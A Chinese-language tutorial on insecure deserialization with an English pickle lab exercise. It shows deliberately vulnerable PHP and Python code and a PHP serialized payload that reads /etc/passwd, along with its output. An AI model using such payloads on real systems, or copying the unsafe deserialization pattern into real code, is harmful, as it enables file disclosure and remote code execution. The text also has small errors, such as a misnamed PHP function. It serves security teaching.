# 不安全反序列化

序列化是将数据转换为适合传输格式的过程，通常表现为字节流。反序列化则是相反的过程，它将提供的数据转换回对象。当不受信任的数据被反序列化时，就会发生不安全反序列化漏洞。反序列化漏洞可能导致多种后果，例如任意文件读取、不当访问控制、远程代码执行等。

## PHP 示例

假设存在以下 PHP 代码：

```php
<?php
class filehandler {
    public $file = "readme.txt";

    function __wakeup() {
        echo file_get_contents($this->file);
    }
}

$data = base64_decode($_GET["input"]);
$obj = unserialize($data);
var_dump($obj);
?>
```

这段 PHP 代码从 GET 参数 `input` 中获取用户输入，对其进行 Base64 解码，然后对其值进行反序列化。

由于我们能够控制服务器正在反序列化的数据，因此可以与 `filehandler` 类进行交互。该类包含 `__wakeup` 方法，这是一个魔术 PHP 方法，每次重建对象时都会执行。我们可以利用这个魔术方法通过如下载荷在目标系统上读取任意文件：

```php
O:11:"filehandler":1:{s:4:"file";s:11:"/etc/passwd";}
```

让我们快速深入分析该载荷并解释其结构：

- **O:11**
  `O` 指代对象将使用的类。在本例中，它是 `filehandler`，其字节长度为 11 字节。

- **:1**
  类名后的 `:1` 表示仅有一个参数传递给对象。

- **s:4:"file";s:11:"/etc/passwd"**
  最后，我们将参数传递给 `filehandler` 对象。`s:4` 指示参数名称是一个字符串（s），字节长度为四，且参数变量名为 `file`。我们传入的参数值设置为 `/etc/passwd`，其前面的分号代表值的结束。

输出示例：

```text
root:x:0:0:root:/root:/bin/ash
...
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
object(filehandler)#2 (1) {
  ["file"]=>
  string(11) "/etc/passwd"
}
```

正如我们在上面发送的载荷中所看到的，我们成功接收到了文件 `/etc/passwd` 的内容。这是因为在反序列化期间执行了魔术方法 `__wakeup`。

```php
function __wakeup() {
    echo file_get_contents($this->file);
}
```

代码识别出给定载荷中的 `file` 参数，并在 `get_file_contents(...)` 函数中使用其值（`/etc/passwd`），从而暴露了文件内容。

### Insecure deserialization - Python pickle

Insecure deserialization - Python pickle

Exploit the insecure deserialization process made by the function `pickle.loads()` to archive a remote code execution (RCE) on the target system. Use the RCE to extract the flag which is located in the system enviroment variables.

Be aware

~ The second hint gives the exploitation code to create serialized payloads that can execute system commands on the target

code

```py
from urllib.parse import unquote
import base64, pickle

# Take user input and URLdecode then base64 decode it
try:
    data = unquote('§输入§')
    data = base64.urlsafe_b64decode(data)
except:
    print('The data do not seem to be base64 encoded?')
    exit(1)

# Deserialize data provided by the user
result = pickle.loads(data)
print(result)

```

WAF 对输入进行 URL 编码，仅手动 base64 编码

setup code

```py
import os
os.environ["FLAG"] = flag
```
